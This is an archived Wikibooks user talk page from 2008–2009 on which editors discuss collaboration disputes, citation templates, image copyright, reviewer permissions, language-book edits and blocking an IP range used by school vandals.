It appears we've both annoyed, irritated, or in some fashion deviated from a productive path.  It was not my intention to be obstructive on the page.  I just wanted you to go ahead and do what you want with the page.  If something arises that bothers me, I'll let you know on the page.  I do not want this latest 'spat' to cause a impedance on the book.  The last thing we need is someone else revising the book... yet again.  I did not wish for us to butt heads so much to annoy you to the point where you don't believe you can communicate with me on a subject.  I apologize if it appeared that way.  I can get a bit adamant about topics that I strongly against/for, and my speech can dictate this even more.  I hope we can move on to produce this page, and not alienate each other.  --[[User:Retropunk|Retropunk]] ([[User talk:Retropunk|talk]]) 07:08, 28 June 2008 (UTC)

: Thanks for this message. I apologise for not responding sooner. I have been away from Wikibooks for a few days. I'm glad you're interested in working to improve our cooperation on this book.
: It seems we may have a different idea of how to collaborate on editing these pages. I saw that you were editing these pages quite heavily and assumed that you had a specific idea in mind. Rather than step in and change things for what the &quot;better&quot;, I offered an alternative. That's just my way. If you'd prefer that I just change what I want, please say so. At the same time, I'd hope that you'll try to restrain yourself from changing large blocks of my edits without discussing it first &amp;mdash; or at the very least explaning your rationale on the relevant talk pages.
: I'm a big rationalist and believe that requiring ideas to be argued for is no obstacle but rather a great advantage since no idea is ever better than the best critisism it has withstood. I'm always ready to discuss issues at hand (perhaps I'm too careful and not bold enough). Again, I appreciate your comment and look forward to our continuing collaboration. --[[User:Swift|Swift]] ([[User talk:Swift|talk]]) 23:56, 1 July 2008 (UTC)

== [[Japanese]] ==

Hey swift, I just wanted to let you know that I've taken a look at this book and it's really coming along nicely. Obviously there is a long way to go, but it wouldn't surprise me to see this book on [[WB:FBN]] one day. Good work, and happy editing! --'''Whiteknight'''&amp;nbsp;([[User:Whiteknight|Page]])&amp;nbsp;([[User talk:Whiteknight|Talk]]) 17:07, 8 August 2008 (UTC)

== undivided main page ==

Hi Swift,

You requested that everything be placed on the first page to provide a single page view. This has now been done not in the Wikibooks but in the [[wikiversity:Optimal_classification|Wikiversity version]]. Enjoy! [[User:Typetive|Typative]] ([[User talk:Typetive|talk]]) 12:08, 10 August 2008 (UTC)

== Thanks ==

The global log on has made it easier to contribute across projects. I'm mainly an English wiki guy, but have started editing some on the Japanese wikipedia. Stumbled across the book, and see that others are working to make it better. Not sure how much I'll be able to contribute, but can add some of my hands-on experiences from time to time. I lived in Japan for three years, starting with my senior year in high school (military brat/air base). I learned Japanese starting with the hiragana first, and now have a hard time reading any Japanese text made entirely of Romaji. It just makes my head hurt. Working on the Japanese wikipedia is also helping keep my knowledge fresh and testing my vocabulary every day. I'll help in anyway that I can.[[User:Dcmacnut|Dcmacnut]] ([[User talk:Dcmacnut|talk]]) 01:56, 7 September 2008 (UTC)

== Japanese Lessons ==

I've  made a first cut at [[User:Retropunk/Japanese_Curriculum/Lesson_1|Lesson 1]] from Junesun's list.  It's very rough right now, but if you want to modify it, Feel free.  I cut and pasted a bunch of lesson notes from other pages, so it's not organized well.  --[[User:Retropunk|Retropunk]] ([[User talk:Retropunk|talk]]) 07:03, 17 October 2008 (UTC)

== change from [[Help:Templates]] to [[Help:Templates Overview]] ==

Hi, sorry if I shouldn't have changed this, but since darklama has renamed the page and appears to want to redirect [[Help:Templates]] to [[Help:Template]] I thought that all links to [[Help:Templates]] should be changed to [[Help:Templates Overview]] otherwise they might link to a different page soon. --[[User:Martin Kraus|Martin Kraus]] ([[User talk:Martin Kraus|talk]]) 11:59, 17 December 2008 (UTC)

: Generally, don't modify comments. If you have to modify your's, consider using &lt;nowiki&gt;&lt;del&gt; and &lt;ins&gt;&lt;/nowiki&gt; tags. Updating links from pages is a good idea, but doing so on talk pages can alter context. Don't modify other people's commments. Not even fixing spelling or grammar. They are signed and timestamped for a reason. --[[User:Swift|Swift]] ([[User talk:Swift|talk]]) 16:45, 17 December 2008 (UTC)

== MagicJack edits ==

Hi. I appreciate your contribution to http://en.wikibooks.org/wiki/MagicJack/Introduction. But, I was wondering why you deleted the link to http://en.wikibooks.org/wiki/Voice_over_IP which was on that page?

Thanks. --[[User:Az2008|Az2008]] ([[User talk:Az2008|talk]]) 01:06, 31 December 2008 (UTC)

: Oh, sorry. I was going to move it to a &quot;See also&quot; section. Since it is on a related matter, I figured it deserved proper prominence on the main page. Thanks for the heads-up, I'd gotten side-tracked reviewing the book, whether it belonged there (I noticed your discussion with Panic) and reading about the software on various sites. --[[User:Swift|Swift]] ([[User talk:Swift|talk]]) 03:06, 31 December 2008 (UTC)
:: Thanks. I put it back where it was. I don't think a &quot;see also&quot; heading is appropriate on the main page. We'll probably change the &quot;Benefits and Criticisms&quot; to &quot;Customer sentiment often found in reviews&quot;, and then put the &quot;Benefits&quot; topic under the Introduction. There we'll provide a comparison to other services. And perhaps links to definitions of VOIP (if they weren't seen in the footnote).
:: I also noticed you changed some links to relative paths. This is contrary to what I was told to do by &quot;darklama&quot; in the reading room. So, I'd rather stick with what I was told by the first person to offer advice.

::: I'm not terribly impressed by your style of collaboration. I'm going to back off from editing the book. My intentions were to help address the issues already raised with it. Unless this book is mended, it will be proposed for deletion. You're not making the case for the book any stronger.
::: As for the relative paths. I believe Darklama (I assume you're referring to [http://en.wikibooks.org/w/index.php?title=Wikibooks:Reading_room/Assistance&amp;diff=1366506&amp;oldid=1366481 this comment]) was explaining the difference between the ''slash-'' and ''colon-conventions''. Thought I see how you could interpret it that way, I doubt he was recommending absolute links as opposed to relative ones. You may want to have a look at the tips section of the [[Wikibooks:Naming policy|Naming policy]]. The relative links both provide a useful shorthand and make book renames easier. --[[User:Swift|Swift]] ([[User talk:Swift|talk]]) 07:24, 31 December 2008 (UTC)</text>

To prevent achievement of an unclosed issue...  --[[User:Panic2k4|Panic]] ([[User talk:Panic2k4|talk]]) 19:07, 3 January 2009 (UTC)
: Should that be &quot;achievement&quot; or &quot;archiving&quot;? --[[User:Swift|Swift]] ([[User talk:Swift|talk]]) 02:02, 4 January 2009 (UTC)

:: :) Sorry archiving, I tried to alter the undo so to state that in the comment but failed (it also seems the software ignores duplicate undos, even if the comment is altered, with no warning message, it silently discards the edit).
:: Since I was the proposer of the action, achievement is the goal :), I blame my spell corrector and my inattention for this one...
:: Just a further note, I don't think it is a good idea to have a bot archive that discussion page, since even if admins aren't obligated to accommodate request, pending and valid requests (in compliance with Wikibooks practice, policies and guidelines) that aren't acted upon shouldn't be discarded, such issues should only be closed by human intervention. I have in my todo list to see if mine was the only pending request that was automatically archived.  --[[User:Panic2k4|Panic]] ([[User talk:Panic2k4|talk]]) 02:18, 4 January 2009 (UTC)

== Being Bold ==

Just wanted to say a little about '''being bold''', the assertion of one's opinion is always welcome, equally fair input from others which disagree's is a necessary for any '''bold''' person that is going to assert their ideas as representing any truth value.  The value of disagreement is that helps improve upon the assertion.  Different opinions are maintain the truth, basically said the truth is only what two or more people say it is.--[[User:Recovery Psychology|recoverypsychologist]] ([[User talk:Recovery Psychology|talk]]) 22:18, 10 January 2009 (UTC)

: I'm not quite sure what prompted this. Nor really what it means... --[[User:Swift|Swift]] ([[User talk:Swift|talk]]) 03:48, 11 January 2009 (UTC)

A portion of what was in the [[Psychiatric Rehabilitation and Recovery]] was moved in to [[A Textbook on Recovery Psychology]] I was the primary contributor there; Now Psychiatric Rehabilitation is an actual academic subject at Boston University, University of Illinois in Chicago, University of medicine and Dentistry New Jersey and Internationally ...although as you may have already figured; I feel that instead of being the discussion of social work (Psychiatric Rehabilitation) it should be the discussion of psychology (behavior science); the work I did on this was also messy; however it was never nominated for deletion. Can the text be set back...same as another is deleted?  Since psychiatric rehabilitation is not an innovation of any sort; and an already existing discipline.--[[User:Recovery Psychology|recoverypsychologist]] ([[User talk:Recovery Psychology|talk]]) 03:37, 12 January 2009 (UTC)

: I'm still not sure what you're talking about. Are you still on the topic of &quot;Being Bold&quot;? Could you reword your thoughts or put them on a more plain form? --[[User:Swift|Swift]] ([[User talk:Swift|talk]]) 04:04, 12 January 2009 (UTC)

:: Sorry to intrude, but I hope to enable productivity. For what I understand of the conversation the user is requesting a un-merge, I don't see any problem with the request, but I also don't understand the need for the request, I've examined the [[Psychiatric Rehabilitation and Recovery]] and all content is there in the edit history, but it depends on what he is really requesting...  --[[User:Panic2k4|Panic]] ([[User talk:Panic2k4|talk]]) 06:36, 12 January 2009 (UTC)

: If only requesting the recovery of the content previously visible on the [[Psychiatric Rehabilitation and Recovery]] project you can do it yourself (page by page), just go into each page edit history and see what version you want to restore, select edit click edit and click submit and you will perform what is simply a content reversion.&lt;br&gt;
: I've checked a previous version of the project main page and all content seems to be still there but blanked, when the merge was performed it missed the step to request a deletion of the old pages, so you don't need an undeletion (available only to admins), if you wish all pages on that project namespace to be reverted to a specific state in time I don't know if Swift can do that with some admin tool but he will tell you about it here if that is what you are after (be sure to check what time you want to rollback the pages...
: Avoid duplicating the scope (as you expressed above), and extensive duplication of content across the two projects (a probable result of a simple restoration, with no major rework and restructuring). If you wish to undo the move (remove all content from the destination) [[A Textbook on Recovery Psychology]] you should propose that on that project talk page first and give participants a chance to object or advance other solutions... (even if you are also the single or active contributor to that book) --[[User:Panic2k4|Panic]] ([[User talk:Panic2k4|talk]]) 06:36, 12 January 2009 (UTC)

I was under this understanding that a wiki was first multi-user; that leaves room for it to be democratic, So I preceive it to have checks and balances, the ethos of good faith, that when people are cooperative...If you are famillar with psycho-sociological concepts such as group think or conformity etc; particularly self-censorship...I would think that '''being bold''' is about not having any fear to learn-teach as writer on a wiki...and that fallacies, errors, inconsistencies could be addressed by others in fair educational and objective manner...since each writer is equally an editor...so when I am anywhere in a wikimedia and read the basic concepts of the wiki, I was under the impression that if I am to assert a new way of thinking...that would be a way which such thinking is perfected; by the benefit of objective criticism (from other wikiusers)...that was my intrepretation of wiki ethos--[[User:Recovery Psychology|recoverypsychologist]] ([[User talk:Recovery Psychology|talk]]) 13:27, 13 January 2009 (UTC)

: Sorry, nope. I'm still can't make much sense of this. What are you trying to get at? --[[User:Swift|Swift]] ([[User talk:Swift|talk]]) 13:36, 13 January 2009 (UTC)

::If I could also be bold in suggesting what [[User:Recovery Psychology|recoverypsychologist]] is getting at? I believe this is a reference to the VfD for Recovery Psychology, where I suggested it was all original research (it is a synthesis of existing ideas to create a new one). So, to paraphrase: &quot;...I was under the impression that if I am to assert a new way of thinking [i.e., write some OR] that would be a way which such thinking is perfected [i.e., by other editors &quot;improving&quot; the OR] ;by the benefit of objective criticism (from other wikiusers)...that was my intrepretation of wiki ethos&quot;.

== buggy external editor ==

: I suspect there is a bug in the external editor you use.
: What can I do to get that bug fixed, other than whine to you about it? :-)
: details:
: I reverted an edit you recently made[http://en.wikibooks.org/w/index.php?title=A_Textbook_on_Recovery_Psychology/Unit_2/Ch1_Mood_Disorders&amp;diff=next&amp;oldid=1370220] to the previous version you had made.
: That now-reverted edit made no sense to me. It seems to consist entirely of replacing many spaces with underscore characters (&quot;_&quot;) and deleting the &quot;reflist&quot; at the end, neither of which seem to improve the page. (Was there some other change I missed in my quick skim of the diff?)
: The comment on that edit mentioned an &quot;external editor&quot;.
: I'm guessing a bug in that external editor caused those mystifying changes.
: --[[User:DavidCary|DavidCary]] ([[User talk:DavidCary|talk]]) 18:07, 15 January 2009 (UTC)

:: Hey DavidCary. Thanks for bringing this to my attention!
:: Actually, these edits were actually conscious decisions rather than an editor bug. The {{tl|ref}} template creates HTML id attributes and sets them to the first variable passed to the template. These tokens [http://www.w3.org/TR/REC-html40/types.html#type-name cannot contain spaces]. The target anchors won't work if the names aren't well formed. --[[User:Swift|Swift]] ([[User talk:Swift|talk]]) 10:35, 16 January 2009 (UTC)

::: I didn't notice that until you pointed it out. I see now. The links created by each {{tl|ref}} template don't work in the version I reverted to. But they didn't work before I reverted, either, because there is not yet a corresponding {{tl|note}}. The links created by things like &lt;code&gt;&lt;nowiki&gt;&lt;ref&gt;Fred, 2009&lt;/ref&gt;&lt;/nowiki&gt;&lt;/code&gt; (the &quot;ref&quot; tags, not the &quot;ref&quot; template) didn't work just before I reverted -- because there was no &lt;code&gt;&lt;nowiki&gt;&lt;references /&gt;&lt;/nowiki&gt;&lt;/code&gt; tag or {{tl|reflist}} template. But &quot;ref&quot; tags now work in the version I reverted to.
::: Using what I recently learned while exploring this, I've added a few usage notes to the {{tl|ref}} template -- including a link to a Wikipedia style guideline that seems to prefer the &quot;ref&quot; tags over the &quot;ref&quot; template.
::: Do you have a preference for the {{tl|ref}} template over &lt;code&gt;&lt;nowiki&gt;&lt;ref&gt;&lt;/ref&gt;&lt;/nowiki&gt;&lt;/code&gt; tags in that Wikibook? --[[User:DavidCary|DavidCary]] ([[User talk:DavidCary|talk]]) 05:02, 22 January 2009 (UTC)

:::: There were no {{tl|note}}s because the text didn't have the full citations, only the references. I put these in so the book contributor could easily add the notes and thus have a properly referenced module. This was part of the discussion on the deletion of that book.
:::: As for usage, see: [[Help:Editing#References]]. I guess I should have linked to that page from the relevant templates.
:::: I'm not sure if I have a preference. I've used both, but neither often nor consistenly. The ref-tag is easier to add and it orders the list automatically. The template ''might'' be more useful for multiple citations to the same reference.
:::: Let me know if you're going to work on this. Otherwise I'll have a look myself. --[[User:Swift|Swift]] ([[User talk:Swift|talk]]) 06:29, 22 January 2009 (UTC)

I'm unable to access and/or move these pages. --[[User:Martin Kraus|Martin Kraus]] ([[User talk:Martin Kraus|talk]]) 12:55, 26 January 2009 (UTC)

: Same here! I've been trying to access them, but can't seem to be able to. &lt;code&gt;:-S&lt;/code&gt; I thought it might be my connection, but I seem to be able to navigate and edit other pages without problems. There might have been some nasty stuff left for us on those pages...

Is there a reason for that? [[User:Chazz|Chazz]] &lt;small&gt;([[User talk:Chazz|talk]])&lt;/small&gt; 16:11, 6 February 2009 (UTC)

::::: Big Fuk goes back a [[Special:Contributions/Big Fuk|long time]]. The first edits go back to 2005, but then nothing (including deleted contributions) until last month. There are some logs that only go back as far as December 2004. If he made himself a bunch of accounts years ago, then they might not be logged. You really have to pity him.
::::: As for the IP, are you asking why the IP changed or why the latter is still unblocked? --[[User:Swift|Swift]] ([[User talk:Swift|talk]]) 16:28, 6 February 2009 (UTC)

::::::More why it is still unblocked. It looks to me like this is a school with a block of IP addresses, and a bunch of yobs who are getting their jollies by competitive vandalism in a computer class.

::::::I suspect it's a smaller range: not 92.43.64.*, but 92.43.64.64/27 which would cover from .65 to .95. [[User:Chazz|Chazz]] &lt;small&gt;([[User talk:Chazz|talk]])&lt;/small&gt; 17:04, 6 February 2009 (UTC)

::::::: Thanks. That saves me from revising netmasks after reading up on this. For those interested (and me later on): [[mw:Help:Range blocks]]. [[Wikibooks:Administrators]] talks about blocking only open proxies with indef. I haven't been able to find a working tool to check for open proxies. Thoughts on that? Perhaps blocking the full range for a short while might do the trick. --[[User:Swift|Swift]] ([[User talk:Swift|talk]]) 17:17, 6 February 2009 (UTC)

::::::::As an IT geek, I have learned the shortcuts to finding netmasks. The first three octets are identical, so you have at least /24 (add 8 for each identical octet). 77 in binary is 01001101, 87 is 01010111, the initial three bits 010 are the same, so add 3 more for /27. 01000000 is 64, so the block starts at 64 and goes to 01011111 = 95; .64 and .95 would be reserved. As for open proxies, I think you'd have to check with your fellow admins; I'm a mere editor. Though in my wanderings, I have heard it suggested that anything from an hour to a week block is usually done on this sort of thing. As in this case we're probably blocking an entire school, I'd think maybe a day at most... but then, they are likely to have another computer class later in the week. Hmm. Were I in your shoes, I'd go for a week. But I'm harsh. [[User:Chazz|Chazz]] &lt;small&gt;([[User talk:Chazz|talk]])&lt;/small&gt; 17:35, 6 February 2009 (UTC)

Hi Swift,
Thank you very much for the ''swift'' reply :) I think that your suggestion about the wiki books is the better idea.

: That said, I'm one of those who prefers discussions all taking place on the same talk page (while some prefer always replying on the other person's page) so that discussions are easier to follow and others can join.

== Splash screen on Mapudungun book ==

Hi swift, thank you for your comments on my [[User:edeldstam|talk page]]. Im a beginner on wikibooks and I chose to use a splash screen because I looked at the spanish wikibook and took the structure from that book. I agree however that a splashscreen is not the best way to go and have been thinking of changing it, I just havn't had the energy to find out how to change the structure to something else, for example the structure you have in your japanese wikibook. Maybe you can help me change the structure or show me where to read about a way to do so. 

When it comes to the categorising of subjects, again I only looked at the spanish wikibook. Whichever system for categorizing as the wikibook community finds best ill use.

== Just recieved an image copyright violation? ==

Hello Swift,

You just sent me an image violation and i am not how to correct this. I retrieved both of my images for my ECI article from WikiCommons which I was told I would not be violating copyright by using these images. I was even more careful and used images which were provided by the U.S. Government and therefore (as far as I understand) in the public domain. I am new to Wikibooks and need further instructions as to what i need to do to keep these images which have boosted my grade. Thank you for your time.

== Message from Kbroo025 ==

I received your message asking for clarification on my photos. The images from my user page were taken by my family on my personal digital camera. My mother took the first one and my sister took the second two. I consider myself the author because I set up the shots (I am an aspiring photographer.) and then just asked them to push the button for me.

: Hi Kbroo025. Whether you consider yourself the author doesn't change copyright law. I am not a lawyer, but as far as I know, it is not the person directing or commissioning the work who is the author, unless the person who creates the work explicitly release their work to them. I suggest that you just ask your siblings if they're fine with multi-licensing these under GFDL + CC-BY-SA 1.0-3.0 and cite them as the authors.

: Hey Thenub,
: These look pretty good. I recompiled Inkscape with LaTeX support, but couldn't get it to work. Your's look really good. I'll have to spend some time on that later.
: If I were to make any suggestions:
:* [[:File:Cylinder with cross section at height x.svg]]: The curly braces differ in overall size, not just line-height, so the bigger one is also noticably thicker. I'm not sure how this would be fixed, but [[:File:Similar triangles for cone.svg]] seems to do that.
:* [[:File:Plane intersecting cone 2.png]]: Different colours for the plane and cone would help give contrast between the two, but it might be a pain to make the colour overlap work properly.
:* Maybe add a some graphic representation of &lt;math&gt;dx&lt;/math&gt; in [[:File:Cylinder with cross section at height x.svg]] and [[:File:Sphere with cross section.svg]]. Could either be just a double-arrow or something like that, or low cylinders instead of disks to show that &lt;math&gt;A dx&lt;/math&gt; is acutally a volume.
: All in all, the page looks quite nice. Good work. I hope this helped. --[[User:Swift|Swift]] ([[User talk:Swift|talk]]) 00:24, 21 February 2009 (UTC)

:: Hi Swift. Thanks!

I agree with you that there needs to be a lot more with Riemann sums and images with dx, but there needs to be the corresponding change in the whole point of view of the text.  I am hoping [[User:W3asal|W3asal]] and I will can get the text in decent shape, and then tweak the images a bit further.  (For example I think a pyramid would be far better then a cube so all our cross sections are not circles.   The thinker lines were cased me me scaling if inkscape.  If your careful to stretch only in the direction of the brace (or make the size correct in latex) then you don't end up with thicker lines but I had the image of the circular cone handy.  I have touched up the images to take the first two suggestions into account, I will make the third chage too after the text involves Riemann sums a bit more.

== Request for comments from Pmw57 ==

Hi Swift, I would like please too, to jump on the bandwagon and ask if you could pass your eye over some extensive changes that I've been making to parts of the JavaScript book. For example, there is the page about the script tag from [http://en.wikibooks.org/w/index.php?title=JavaScript/The_SCRIPT_Tag&amp;oldid=1384827 before the changes] and [http://en.wikibooks.org/w/index.php?title=JavaScript/The_SCRIPT_Tag&amp;oldid=1421824 after the changes]. It's a big difference but it was arrived at by a series of gradual improving changes. [[User:Pmw57|Pmw57]] ([[User talk:Pmw57|talk]]) 22:26, 21 February 2009 (UTC)

: No problem. Sorry it took so long. The change is definitely an improvement. Keep up the good work. My main point was going to be to add syntax highlighting, but you've already done that in [http://en.wikibooks.org/w/index.php?title=JavaScript/The_SCRIPT_Tag&amp;oldid=1422293 the current version].

== do not bite newcomers (wiki policy) ==

: &lt;span style=&quot;font-size:smaller&quot;&gt;[[User:Ricardoramalho]] felt unhappy with how I [{{fullurl:Talk:Dutch|diff=1437192&amp;oldid=1437104}} greeted] [{{fullurl:User_talk:Ricardoramalho|oldid=1437194}} him] here at this project and contacted me here with the following comment.

I have to say you did bite me: not only with your defensive reply, I believe you do not have the right to edit my first comment by adding my signature (!) in the Dutch book discussion, I was logged in, and my contribuition signature could easily be found in the page history. No user is forced to sign contributions. I would apreciate if you could undo that edition in my first line. Now if you want to delete out this comment from your page it is okay. Let´s forget about it. (Do you even speak Dutch? Are you really interested in that book matter? Now I know why ''assume good faith'' and ''do not bite newcomers'' are there for... [[User:Ricardoramalho|Ricardoramalho]] ([[User talk:Ricardoramalho|talk]]) 21:54, 8 March 2009 (UTC)

: I'm sorry to hear that, Ricardoramalho. I'm happy, however, that you also see the value in assuming good faith. While you may feel bitten, my reply to your comment on [[Talk:Dutch]] was neither intended as defensive or spiteful.
: While I believe one should avoid editing other people's comments (a good rule of thumb to avoid misunderstandings) it is standard practice here on English Wikibooks to sign comments and mark unsigned ones with the contributor and a timestamp. I don't remember there being a case of a user not wanting to sign their comments and can't really think of a case where this might be benefitial. If there is an argument for that, I'd be interested to hear it.
: I don't speak any Dutch but I do work all over the place (mainly [[Wikibooks:Maintenance|cleaning up]]) and try to keep an eye on the language books. They don't get the attention they need and most have been abandoned.
: As for my defensive reply, please see my second reply on the Dutch talk page. Take care and happy editing. --[[User:Swift|Swift]] ([[User talk:Swift|talk]]) 03:15, 9 March 2009 (UTC)

Dear Swift, thanks for your kind replies, and for listening to my position. I was a bit worried about where this conversation would take us. I will try to be as kind as I can: as you know, Wikiprojects encorages people to contribute with their knoledge, people don´t need to be identified, or registered, although identification helps to discuss topics between editors. I prefer sometimes just to leave a track to me, that is why I was logged in (and could be found in the history page).

In some cases identification is not necessary, example: If someone writes an article that is an apology to nazism, and editor could feel unconfortable to correct it, and to be identified. Regarding the edition on my comment the &quot;standard practice here on English Wikibooks to (...) mark unsigned ones with the contributor and a timestamp&quot; seems not to be a policy, and I find it incorrect, because the editor is exposed by force. I didn´t like also the link to my contribuition page in that edition, it felt like an attempt to disqualify my comment, as my contribuition page is almost empty in the English Wikibook. There are many small details that made me fell bitten, as you can see: you called my comment &quot;criticism&quot;. I was critic, but criticism can be interpreted as a bad habit of repetitive negative critic comment, which was not the case. So, to finish this long letter, because of all that, I concluded that you took my observation personally, when it was not, and that your motivation, and reaction, was apparently not related to the Dutch language development, but to teach wiki good manners. (You told me to ''be bold'', suggesting me to edit the Dutch page, without knowing my Dutch or editing skills)(and since you don´t speak Dutch, as confirmed, you could not even verify if my bold edition would be correct). All that constrainment perceived, (that I might be exaggerating, and if yes I am sorry about it) is aggravated by that fact that you are notoriously a powerful, experienced and skilled wiki editor.
 
I believe we, editors of complicated projects like wikibooks and wikiversity, should focus more in the user, and cooperative relations, as ours, and treat internal affairs carefully. Okay, I am feeling much better now. Thanks for your leadership and hard work. (a cleaner can be really scarry, when my wife starts cleaning...)  :^)  We keep in touch.

== reviewed pages ==

Hi Swift, One of the pages (chapters) of the book my students have been working [[Cultural_Anthropology/History_of_Anthropological_Theory]] on is somehow tagged for sighted revisions. I do not see any markup on the page that sets this status. Because it is set as in need of review for the 106 changes recently made it does not seem to display properly unless one is logged  in. Could you instruct me on how to remove the 'reviewed' status or how to approve changes (a link?). The last 'reviewer' was Panic2k4 who I noticed you had some disagreements with in the past so I thought I would ask you rather than Panic2k4. I finally got to a page that offered Edits will be incorporated into the stable version once an authorised user reviews them. The draft is shown below. 106 changes await review. - but who is an authorized user. --[[User:Paul James|Paul James]] ([[User talk:Paul James|talk]]) 22:45, 11 March 2009 (UTC)
:Paul (sorry to intrude here Swift), an authorised user in this context is an editor or reviewer (see [[Wikibooks:Reviewers]]). As you are a lecturer working on a class project, I've added you to the Editor group. You should now be able to review the changes yourself. Thanks. &lt;font color=&quot;#E66C2C&quot;&gt;[[User:QuiteUnusual|'''Unusual? Quite''']]&lt;/font&gt; &lt;sup&gt;&lt;font color=&quot;#306754&quot;&gt;[[User talk:QuiteUnusual|TalkQu]]&lt;/font&gt;&lt;/sup&gt; 22:54, 11 March 2009 (UTC)

: Hey to the both of you. This really isn't such a big deal. Yes, users who aren't logged in may only see the out-dated version, but since the work is still in progress, and the editors are all logged in, this isn't really a problem. Contributors should get promoted in due course. We're working on lowering the criteria for the system to do so automatically. That would the proper solution and the best one in the long term.
: Qu: Originally, manual editor status was supposed to require [[WB:RFP]]. I personally think that the practice of granting it too freely does more harm than good in the long term. It really isn't necessary, and we loose a valuable insight into the shortcomings of the automatic system. *sigh* FlaggedRevs, and the way we've handled it so far, is starting to be more hassle than it's worth...

::Does it?  I read this &quot;''All contributors will receive the editor flag automatically once they meet the criteria. Requests should be made here '''only''' if you cannot meet the requirements (for example, you have been blocked in the past). Administrators may use their best judgement in granting the editor and rollback flags. All other tools require community consensus, as determined by a bureaucrat.''&quot;  and presumed it meant consensus was not required - although I guess it should have been posted to RFP (although I note nobody else is following this process, check the user rights log!). FlaggedRevs autopromotion, basically, doesn't work properly - still hasn't promoted me and their are stacks of other contributors who seem to meet the criteria who it doesn't promote. I don't think we should give up though. &lt;font color=&quot;#E66C2C&quot;&gt;[[User:QuiteUnusual|'''Unusual? Quite''']]&lt;/font&gt; &lt;sup&gt;&lt;font color=&quot;#306754&quot;&gt;[[User talk:QuiteUnusual|TalkQu]]&lt;/font&gt;&lt;/sup&gt; 08:15, 12 March 2009 (UTC)
::: I'm sure you've by now noticed the lack of consistency in certain parts across Wikibooks. The bit you cite implies that a user who wishes to get expedited editor flags cannot request the flag there unless they won't ever be auto-promoted ''but'' can ask an administrator personally. Then there isn't much use in the RFP to begin with. This phrase was inserted well before the problems with auto-promotion became apparent. The system was originally supposed to handle this completely. I don't see the bit on &quot;best judgment&quot; intending to mean admins should flag users as editors aside from the RFP. Similar to [[WB:RFI]]s, the process just doesn't need the same scrupulous discussion and consensus but has a clear process.
::: As for people ignoring processes, I haven't checked the user rights log for a while. Last time I checked, Whiteknight had been flagging a bunch of people. Despite my differences with Panic and thinking little of his conspiracy theories (though it's true that some would love to see him leave, chased away or blocked), I do recognise that the way certain things get done here don't exactly inspire those who may disagree with certain decisions to have faith in the fairness of the process. Some admins believe &quot;common sense&quot; should prevail over &quot;pedantry&quot;. The former is too often confused with &quot;my sense&quot; and the latter as ambiguous as &quot;prioritising&quot;. As we now have [[Special:Statistics|over a thousand people]] who've edited Wikibooks in the last 30 days, I think there is value in forming a streamlined process that guarantees that people get treated equally.
::: That aside, none of this poses a threat to Wikibooks. I'd bring it up if I had the time and thought it would go anywhere. I don't know if I'm in a minority view on this and, were it one, whether it would simply be incorrect but/or one that should be advocated. For now I've got other things to occupy my time. --[[User:Swift|Swift]] ([[User talk:Swift|talk]]) 10:11, 12 March 2009 (UTC)

::::Don't get me wrong, I'm not disputing with you. I genuinely read that phrase on the RFP page as meaning +Editor was an admin discretion thing. Having re-read it following your comment here, I can see that I was wrong, and I shouldn't have made the change. In future, if anyone requests it I'll ask them to request it at RFP. Process is important, otherwise it's unfair anarchy. &lt;font color=&quot;#E66C2C&quot;&gt;[[User:QuiteUnusual|'''Unusual?

== You make a good point... ==

Swift, I very much agree with the idea of a Blender 3D Portfolio of Images located somewhere on wikibooks, be it in it's own book of images or a derivative link aboard the Blender 3D: Noob to Pro book. I am still studying on copyright, the odd portion being I know about the free-software copyright attribution license (redundant? maybe....) but have yet to update my images, I apologize and will get right on that (I have been busy with preparing for college, please excuse the tardiness). Now my only concern is...a portfolio of Blender 3D Images is general and should have it's own book, BUT I've noticed that myself and others rarely look at any other Blender books on WikiBooks except for Noob to Pro, even if we see the other books, so I would rather have the portfolio of Blender 3D Images be a subset in the index of Blender 3D: Noob to Pro as it will get more attention.

Well, first of all, I'll make it clear that the reason why I swapped the order of flags on the page [[Urdu/Cover]] does not need any explanation. As you may know, Urdu is actually a '''Pakistani language''' first. It is no doubt, spoken in India too, but the fact is that its position in Pakistan is way higher than that of India. In Pakistan, it is the ''official'' and ''national'' language and is used at government level, business level, education level (almost all of standard Pakistani schools). In India, where [[Hindi]] is the main language, Urdu is official in only 5 states (and is thus included as part of the other 22 official languages) though it is a minority language and is spoken only by the Muslims ( half of them cannot even read or write it though). There are very few insitutions, schools and goverment-level positions where it is even used at all because Hindi is largely the national language of India. 

I cannot foresee why the Indian flag is on the left side whilst Pakistan's flag is on the ''right'' side because it is misleading and gives the impression that both countries uphold equal ratio of the importance and status of the language. In fact, I was about to remove the Indian flag and I see no reason to do so either. 

By the way, I also removed the Taj Mahal picture from the [Hindi]] page because I do not see how it is relevant. especially when it was built by a Muslim king and thus is more like an Urdu-culture oriented monument. 

I hope that some of my little propoganda made sense :) 
[[User talk:124.186.128.15]] 

: Welcome back and thanks for the explanation. I wasn't familiar with the fact that Urdu was more prominent in Pakistan than in India. Your rationale is fair, though I'd say that leaving the Taj Mahal would have been fine (I suspect that Hindi is a useful language for those travelling there).
: Take care and happy editing. --[[User:Swift|Swift]] ([[User talk:Swift|talk]]) 01:17, 23 May 2009 (UTC)
== What license tag for an Excel file?? ==

May I insert an EXCEL file in my Wikibook: Clock and data recovery ? It would help the reader do some circuit simulation by himself, and get confidence in the subject.  But I am unclear about the copyright to respect (MS Excel?), and the license tag to use when uploading. For the rest the file is entirely my own creation. 
Thanks for advising --[[User:BORGATO Pierandrea|BORGATO Pierandrea]] ([[User talk:BORGATO Pierandrea|talk]]) 11:41, 14 May 2009 (UTC)

: Have you considered using an open office version? The problem with Microsquish programs is that the document format is proprietary. You can download open office for free, which meets the requirements for data being read by free software. If you don't expect the user to actually use the application from within the book, you can send it as a PDF file. It seems that creative commons doesn't like ODF file formats for upload any more than Microsquish files however so getting an operable version is a bit of a problem.These days Wikimedia is discussing changing the licensing format but currently it is GFDL and they allow a secondary license such as CC-By-SA 3.0--[[User:Graeme E. Smith|Graeme E. Smith]] ([[User talk:Graeme E. Smith|talk]]) 04:04, 15 May 2009 (UTC)

: Yes, you may upload excel files to wikibooks. I, like Graeme E. Smith, would advocate for using an open file format, but if you expect that an excel file will be most useful to the readers of your book, then feel free to use it.
: You can also just upload the data on multiple file formats. For example, you could include it in a wiki-formatted table and link to the excel, plain text, etc. files.
: Hope that helped. --[[User:Swift|Swift]] ([[User talk:Swift|talk]]) 04:54, 17 May 2009 (UTC)

